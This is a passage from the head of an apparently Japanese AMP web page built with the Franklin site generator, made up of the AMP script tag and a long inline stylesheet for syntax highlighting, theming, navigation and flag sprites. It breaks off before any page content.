<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"amp lang=ja><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}}@media (max-width: 480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}.lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:8rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){#site-nav{top:5rem}}@media (max-width: 480px){.masthead{height:30rem}#site-nav ul li{width:calc(100% - 2rem)}}@media (max-width: 680px){.masthead{height:26rem}#site-nav{z-index:1}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes 